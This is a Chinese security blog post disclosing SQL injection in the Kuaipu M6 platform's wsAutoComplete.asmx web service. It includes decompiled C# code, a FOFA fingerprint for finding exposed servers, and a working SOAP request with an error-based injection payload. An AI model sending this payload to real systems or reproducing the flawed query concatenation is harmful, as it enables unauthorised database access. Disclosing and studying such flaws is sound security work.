---
title: "快普M6 WebService/wsAutoComplete.asmx 多处SQL注入漏洞"
source: https://mrxn.net/jswz/kuaipu-WebService-wsAutoComplete.html
asset_dir: assets/快普m6-webservicewsautocomplete.asmx-多处sql注入漏洞
---

# 快普M6 WebService/wsAutoComplete.asmx 多处SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/31 08:20
* 643浏览
* [0评论](#comment)
* 29分钟阅读

深入探索

VPN服务

身份验证

安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

快普M6整合管理平台的WebService/wsAutoComplete.asmx接口下多个方法存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。攻击者可通过构造恶意SQL语句，绕过参数过滤机制，实现对数据库的任意查询、修改或删除操作，甚至可能获取系统控制权限。

SQL注入防护

# 影响版本

# fofa语法

> body="Resource/JavaScript/jKPM6.DateTime.js"

# 漏洞分析

深入探索

网络安全培训

Web安全书籍

漏洞修复方案

根据漏洞通告，看下 WebService/wsAutoComplete.asmx 里的cs引用

```
<%@ WebService Language="C#" CodeBehind="wsAutoComplete.asmx.cs" Class="KPMIIS.Web.WebService.wsAutoComplete" %>
```

ok,根据引用去找到bin目录下的KPMIIS.Web.dll文件，反编译后找到WebService下的wsAutoComplete实现

代码安全审计

```
public class wsAutoComplete : System.Web.Services.WebService
{
  [ScriptMethod]
  [WebMethod]
  public string[] GetCustomerList(string prefixText, int count, string contextKey)
  {
    if (count == 0)
      count = 10;
    string str1 = " CustName like '%{0}%'or CustPY like '%{0}%' or MemberCard like '%{0}%' or CustCode like '%{0}%'";
    string str2 = !string.IsNullOrEmpty(prefixText) ? string.Format(str1, (object) prefixText) : " 1=1 ";
    using (DataTable table = Gateway.Default.FromCustomSql($"select top {count} CustId,CustName from Common_Customer where {str2}").ToDataSet().Tables[0])

  [WebMethod]
  [ScriptMethod]
  public string[] GetSupplierList(string prefixText, int count, string contextKey)
  {
    if (count == 0)
      count = 10;
    string str1 = "SuppName like '%{0}%' or SuppPY like '%{0}%'";
    string str2 = !string.IsNullOrEmpty(prefixText) ? string.Format(str1, (object) prefixText) : "1=1";
    DataTable table = Gateway.Default.FromCustomSql($"select top {count} SuppId, SuppName from Common_Supplier where {str2}").ToDataSet().Tables[0];

  [ScriptMethod]
  [WebMethod]
  public string[] GetAccountTitleList(string prefixText, int count)
  {
    if (count == 0)
      count = 10;
    string str1 = "ACCOUNT_TITLE_CODE like '{0}%' and (ACCOUNT_TITLE_CODE like '1001%' or ACCOUNT_TITLE_CODE like '1002%')";
    string str2 = !string.IsNullOrEmpty(prefixText) ? string.Format(str1, (object) prefixText) : "1=1";
    DataTable table = Gateway.Default.FromCustomSql($"select top {count} ACCOUNT_TITLE_ID,ACCOUNT_TITLE_CODE, ACCOUNT_TITLE_NAME from ERP_AccountTitle where {str2}").ToDataSet().Tables[0];
```

深入探索

企业安全咨询

JSON处理工具

技术文章订阅

三个方法 `GetCustomerList`、`GetSupplierList`和`GetAccountTitleList`都是差不多的处理逻辑，其中都存在关键参数**prefixText**，没有经过任何过滤或校验检查就被拼接进SQL语句中进行执行了，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，非常的朴实无华。

漏洞预警服务

# 漏洞复现

> 漏洞复现需要打开漏洞文件页面获取一些其他必要参数如\_\_VIEWSTATE之类

```
POST /WebService/wsAutoComplete.asmx HTTP/1.1
Host: kuaipu.mrxn.net
Content-Type: application/soap+xml;charset=UTF-8;action="http://tempuri.org/GetAccountTitleList"

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
   <soap:Header/>
   <soap:Body>
      <tem:GetAccountTitleList>
         <!--Optional:-->
         <tem:prefixText>'-1/user--</tem:prefixText>
         <tem:count>1</tem:count>
      </tem:GetAccountTitleList>
   </soap:Body>
</soap:Envelope>
```

[![快普M6 WebService/wsAutoComplete.asmx 多处SQL注入漏洞](images/img-001-85d6ae1d5afd.webp)](https://image.mrxn.net/b79e1a79cef546cb862085838634d11e.webp)

成功通过报错注入在响应回显数据库默认用户dbo

编程

其他两个方法的sql注入也类似，只是需要的参数不同罢了，同时给该接口还支持常规的GET、POST请求方式

[![快普M6 WebService/wsAutoComplete.asmx 多处SQL注入漏洞](images/img-002-b8b311cd45d9.webp)](https://image.mrxn.net/3742544e14dd40ee888e3207a1740890.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[快普M6 WebService/wsAutoComplete.asmx 多处SQL注入漏洞](https://mrxn.net/jswz/kuaipu-WebService-wsAutoComplete.html)  
文章链接：<https://mrxn.net/jswz/kuaipu-WebService-wsAutoComplete.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/kuaipu-WebService-wsAutoComplete.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞预警服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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